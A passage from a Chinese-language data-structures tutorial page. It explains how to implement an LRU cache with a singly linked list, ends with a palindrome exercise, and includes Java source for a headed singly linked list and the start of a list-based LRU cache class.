class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？</p>\n<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。</p>\n<ol>\n<li><p>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。</p>\n</li>\n<li><p>如果此数据没有缓存在链表中，又可以分为两种情况：</p>\n<ul>\n<li>如果此时缓存未满，则将此结点直接插入到链表的头部；</li>\n<li>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</li>\n</ul>\n</li>\n</ol>\n<p>这样我们就实现了一个LRU缓存，是不是很简单。</p>\n<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。</p>\n<p>实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。</p>\n<p>基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。</p>\n<p>和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3></div><br></div>\n\n<p>如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<p><br></p>\n<p>本章代码：<a href=\"https://github.com/AriesRen/algorithm\" target=\"_blank\" rel=\"noopener\">GitHub</a></p>\n<p>带头单链表代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.NoSuchElementException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SinglyLinkedList</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Node&lt;T&gt; head;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SinglyLinkedList</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.head = <span class=\"keyword\">new</span> Node&lt;&gt;(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 链表头部插入值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">linkFirst</span><span class=\"params\">(Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        newNode.next = head.next;</span><br><span class=\"line\">        head.next = newNode;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 链表尾部插入值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">linkLast</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkLast(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">linkLast</span><span class=\"params\">(Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p=p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = newNode;</span><br><span class=\"line\">        size++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 获取头部值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">getFirst</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NoSuchElementException();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> head.next.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 获取尾部值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">getLast</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p.val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 添加</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkLast(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 在某处索引插入</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> index, T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        Node&lt;T&gt; p = node(index);</span><br><span class=\"line\">        insert(p, newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">insert</span><span class=\"params\">(Node&lt;T&gt; p, Node&lt;T&gt; newNode)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; q = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q!=<span class=\"keyword\">null</span> &amp;&amp; q.next!=p)&#123;</span><br><span class=\"line\">            q = q.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (q == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        newNode.next = p;</span><br><span class=\"line\">        q.next = newNode;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 根据值删除某个节点</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">delete</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; !p.next.val.equals(val))&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next== <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = p.next.next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 根据索引删除某结点</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">delete</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; deleteNode = node(index);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> deleteNode(deleteNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">deleteNode</span><span class=\"params\">(Node&lt;T&gt; deleteNode)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> T element = deleteNode.val;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!= <span class=\"keyword\">null</span> &amp;&amp; p.next != deleteNode)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p.next = deleteNode.next;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 根据索引获取值</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= size || index &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">\"Index: \"</span>+index + <span class=\"string\">\", Size: \"</span>+size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> node(index).val;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 通过value 查找对应的索引</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; p.next.val!=val)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            index ++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            index = -<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> index;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">contains</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; p.next.val!=val)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p.next != <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> Node&lt;T&gt; <span class=\"title\">node</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= size || index &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">\"Index: \"</span>+index + <span class=\"string\">\", Size: \"</span>+size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;size)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (i == index)&#123; <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            ++i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkFirst(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">pop</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unlinkedFirst();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">unlinkedFirst</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; first = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (first == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"没有元素\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unlinkedFirst(first);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">unlinkedFirst</span><span class=\"params\">(Node&lt;T&gt; node)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> T element = node.val;</span><br><span class=\"line\">        head.next = head.next.next;</span><br><span class=\"line\">        node.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        node.val = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        size--;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 单链表反转</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reverse</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 链表为空或者链表只有一个元素时</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span> || size &lt;=<span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        Node&lt;T&gt; q = p.next;</span><br><span class=\"line\">        Node&lt;T&gt; r;</span><br><span class=\"line\">        p.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q !=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r = q.next;</span><br><span class=\"line\">            q.next = p;</span><br><span class=\"line\">            p = q;</span><br><span class=\"line\">            q = r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        head.next = p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打印链表 example: [1, 2, 3]</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"[]\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"[\"</span>);</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            sb.append(p.val).append(<span class=\"string\">\", \"</span>);</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sb.append(p.val).append(<span class=\"string\">\"]\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Node</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> T val;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Node&lt;T&gt; next;</span><br><span class=\"line\">        Node(T val)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.val = val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>基于链表的LRU缓存代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">LRUCache</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(T val)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">T <span class=\"title\">get</span><span class=\"params\">(T val)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Size</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ListLRUCache</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">LRUCache</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> SinglyLinkedList&lt;T&gt; lruList;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> DEFAULT_CAP=<span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 缓存容量</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> cap;</span><br><span class=\"line\">    <span class=\"comment\">// 缓存使用大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ListLRUCache</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>(DEFAULT_CAP);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ListLRUCache</span><span class=\"params\">(<span class=\"keyword\">int</span> cap)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = cap;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.lruList = <span class=\"keyword\">new</span> SinglyLinkedList&lt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span 